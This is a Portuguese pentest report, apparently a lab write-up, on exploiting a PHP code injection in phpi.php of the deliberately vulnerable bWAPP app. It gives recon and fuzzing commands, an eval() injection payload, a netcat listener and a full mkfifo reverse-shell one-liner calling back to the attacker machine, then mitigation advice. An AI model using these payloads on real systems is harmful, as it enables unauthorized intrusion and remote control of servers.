#RELATÓRIO DE TESTE DE INVASÃO (PENTEST) – bWAPP

Alvo: 192.168.56.103 (VM Vulnerable Web) Atacante: 192.168.56.101 (Kali Linux) Data: 19 de Março de 2026

##RESUMO EXECUTIVO
Este documento detalha o teste de invasão realizado na aplicação bWAPP. Foi identificada uma vulnerabilidade crítica de PHP Code Injection no componente phpi.php. A falha permite a execução remota de código (RCE), possibilitando que um atacante obtenha controle total do servidor web com os privilégios do usuário www-data.

 METODOLOGIA
O teste seguiu as fases padrão de um Pentest profissional:
1.	Reconhecimento e Varredura: Descoberta de ativos e serviços.
2.	Enumeração: Mapeamento de diretórios e arquivos da aplicação.
3.	Análise e Exploração: Identificação e exploração da falha de injeção.
4.	Pós-Exploração: Ganho de acesso interativo (Reverse Shell).




DESENVOLVIMENTO TÉCNICO
Reconhecimento e Varredura de Rede
A primeira etapa consistiu em localizar o alvo na rede local e identificar portas abertas.
•	Comando Netdiscover: netdiscover -r 192.168.56.0/24
•	Comando Nmap: nmap -v -n -sS -Pn --open -p- 192.168.56.103
 
 <img width="886" height="230" alt="image" src="https://github.com/user-attachments/assets/ed810857-fc64-47cb-a524-0cf523ea1d67" />
<img width="367" height="214" alt="image" src="https://github.com/user-attachments/assets/6999c55f-5c20-44a2-83c6-c57db3a4b8b2" />


Enumeração Web
Utilizou-se uma ferramenta de fuzzing para encontrar diretórios ocultos na aplicação.
•	Comando Feroxbuster: feroxbuster -u http://192.168.56.103 -w /usr/share/wordlists/dirb/common.txt

 <img width="886" height="131" alt="image" src="https://github.com/user-attachments/assets/f1f05731-f32e-40cd-8d05-7c7c79bf17d0" />






Identificação da Vulnerabilidade (PHP Injection)
Ao analisar o arquivo phpi.php, verificou-se que o parâmetro message processava entradas do usuário através da função vulnerável eval(). Inserir uma aspa simples (') causou um erro de sintaxe, confirmando a injeção.
•	Payload de Teste: http://192.168.56.103/bwapp/phpi.php?message=system("whoami");
 
 <img width="786" height="328" alt="image" src="https://github.com/user-attachments/assets/b1a058ed-dd69-4c24-ab5a-d56c6100ec52" />
<img width="842" height="59" alt="image" src="https://github.com/user-attachments/assets/320551f4-c458-4b16-a13b-931b7d4d85c6" />


 
 
<img width="717" height="259" alt="image" src="https://github.com/user-attachments/assets/5fcb687a-b1cf-4181-9924-849a93c14b6e" />
<img width="886" height="57" alt="image" src="https://github.com/user-attachments/assets/e733f74c-4e92-43c7-b23f-f916a3667b79" />






Exploração e Ganho de Acesso (Reverse Shell)
Para transformar a execução de comandos em um terminal interativo, foi configurado um Reverse Shell utilizando a técnica de mkfifo.
Passo 1: Preparação do Receptor (Kali) No terminal do atacante, abriu-se uma porta para escuta: nc -nvlp 4444

 <img width="394" height="116" alt="image" src="https://github.com/user-attachments/assets/acac2f7c-d6ba-43eb-8f7e-582737f62626" />


Passo 2: Criação e Codificação do Payload Utilizou-se o site RevShells para gerar o código de conexão reversa e aplicou-se URL Encoding para garantir que o navegador transmitisse os caracteres especiais (como |, ;, &) sem erros.
•	Código Bruto: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.101 4444 >/tmp/f
	 
 <img width="886" height="238" alt="image" src="https://github.com/user-attachments/assets/c91f9198-fa8d-48be-9ef1-aa80ce4d6d83" />
<img width="886" height="80" alt="image" src="https://github.com/user-attachments/assets/a730c0ec-2f27-43cd-a8c9-53aa58910702" />


Encode:
 
 <img width="475" height="109" alt="image" src="https://github.com/user-attachments/assets/ab83d836-cfee-4918-92aa-3b60fc0a886b" />
<img width="886" height="127" alt="image" src="https://github.com/user-attachments/assets/bc23d37e-de7a-4c71-8327-5e9eed21e1c9" />


Prova de Conceito (PoC)
Ao submeter o payload encodado via URL, o servidor bWAPP conectou-se de volta ao Kali Linux, entregando um shell interativo.
•	Confirmação: Execução dos comandos id e hostname dentro do servidor invadido.

 <img width="886" height="47" alt="image" src="https://github.com/user-attachments/assets/78f7c410-b47a-4007-9296-6024939c5ad3" />
<img width="734" height="155" alt="image" src="https://github.com/user-attachments/assets/b303562e-edf6-464c-9dbd-de2b2d78006f" />

 





CONCLUSÃO E MITIGAÇÃO
A vulnerabilidade encontrada é de severidade Crítica. O uso de funções que executam strings como código (como eval(), exec(), system()) deve ser evitado sempre que possível.
Recomendações de Segurança:
1.	Remover funções de execução: Substituir a lógica de eval() por estruturas de controle nativas (como switch/case).
2.	Sanitização de Input: Implementar filtros rigorosos para impedir que caracteres de sistema operacional sejam processados.
3.	Princípio do Menor Privilégio: Garantir que o serviço web não rode com permissões de administrador, limitando o impacto em caso de invasão.

